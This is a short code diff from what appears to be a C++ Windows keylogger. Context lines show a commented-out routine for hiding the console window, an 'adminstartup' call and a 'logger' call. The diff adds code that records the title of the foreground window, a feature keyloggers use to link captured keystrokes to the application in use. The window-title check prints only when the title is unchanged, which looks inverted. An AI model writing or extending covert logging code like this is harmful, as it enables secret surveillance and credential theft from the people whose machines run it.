@@ -113,6 +113,7 @@ void adminstartup()
 }
 
 
+
 int _tmain(int argc, _TCHAR* argv[])
 {
 	//HWND stealth; /*creating stealth (window is not visible)*/
@@ -121,10 +122,34 @@ int _tmain(int argc, _TCHAR* argv[])
 	//ShowWindow(stealth, 0);
 	printf("wear your mask please\n");
 	adminstartup();
+
+
+
+	char title[256] = "";
+	string currentProcessTitle = "";
+
+		HWND handle = GetForegroundWindow();
+		if (handle)
+		{
+			GetWindowText(handle, title, 256);
+
+			if (currentProcessTitle != title)
+				currentProcessTitle = title;
+			else
+				printf("%s\r\n", title);
+		}
+		else
+		{
+			printf("not found\r\n");
+		}
+	
+
 	logger();
 
 	getchar();
 	return 0;
 }
+
+
 
 
